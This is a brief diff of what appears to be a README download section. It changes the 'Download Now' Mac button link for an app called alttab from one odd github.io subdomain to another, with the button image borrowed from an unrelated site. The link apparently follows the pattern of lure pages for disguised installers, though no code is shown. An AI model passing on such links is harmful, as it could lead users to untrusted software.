@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://pregabalin-apps.github.io/.github/alttab">
+  <a href="https://gloremix-apps.github.io/.github/alttab">
     <img src="https://applications.kitco.com/sites/default/files/mac-button.png" width="200" alt="Download Now"/>
   </a>
 </p>
